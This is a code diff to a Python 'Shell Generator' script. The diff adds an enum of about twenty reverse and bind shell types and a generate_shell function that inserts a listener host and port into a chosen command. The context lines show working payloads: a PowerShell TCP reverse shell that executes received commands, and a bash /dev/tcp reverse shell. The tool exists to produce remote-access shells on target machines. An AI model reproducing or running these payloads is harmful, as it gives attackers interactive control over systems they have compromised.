@@ -3,6 +3,34 @@
 Shell Generator
 """
 import argparse,sys
+from enum import Enum
+
+class shellType(Enum):
+    reverse_powershell = 'reverse_powershell',
+    reverse_bash = 'reverse_bash',
+    reverse_perl = 'reverse_perl',
+    reverse_python = 'reverse_python',
+    reverse_php = 'reverse_php',
+    reverse_ruby = 'reverse_ruby',
+    reverse_netcat = 'reverse_netcat',
+    reverse_mkfifo = 'reverse_mkfifo',
+    reverse_java = 'reverse_java',
+    reverse_bash_2 = 'reverse_bash_2',
+    reverse_mknod_telnet = 'reverse_mknod_telnet',
+    reverse_telnet = 'reverse_telnet',
+    bind_powershell = 'bind_powershell',
+    reverse_powercat = 'reverse_powercat',
+    bind_powercat = 'bind_powercat',
+    reverse_socat = 'reverse_socat',
+    reverse_go = 'reverse_go',
+    reverse_php_bash = 'reverse_php_bash',
+    reverse_netcat_sh = 'reverse_netcat_sh',
+    reverse_nodejs = 'reverse_nodejs',
+    reverse_perl_win = 'reverse_perl_win',
+    reverse_gawk = 'reverse_gawk',
+
+    
+
 # {'name':'','type':'','cmd':''},
 shells= [{'name':'reverse_powershell','type':'reverse','cmd':'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(\'LHOST\',LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'},
          {'name':'reverse_bash','type':'reverse','cmd':'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'},
@@ -70,6 +98,21 @@ def get_shell_by_name(name):
         if s['name'].lower() == name.lower():
             return s
         
+# Functions for usage inside a python file
+def generate_shell(shell_name='',shell_type=None,lhost='127.0.0.1',rhost='127.0.0.1',lport=9001,rport=80):
+    if shell_name != '':
+        shell = get_shell_by_name(shell_name)
+    elif shell_type != None:
+        shell = get_shell_by_name(shell_type.value[0])
+    else:
+        sys.exit()
+        
+    if shell['type']=='bind':
+        shell['cmd'] = shell['cmd'].replace('RHOST',rhost).replace('RPORT',str(rport))
+    else:
+        shell['cmd'] = shell['cmd'].replace('LHOST',lhost).replace('LPORT',str(lport))
+    return shell['cmd']
+
 def main():
     parse_parameters()
     rhost = "0.0.0.0"
@@ -126,4 +169,6 @@ def main():
     
 
 if __name__ == '__main__':
-    main()
+    #main()
+    for s in shells:
+        print(f"{s['name']} = '{s['name']}',")
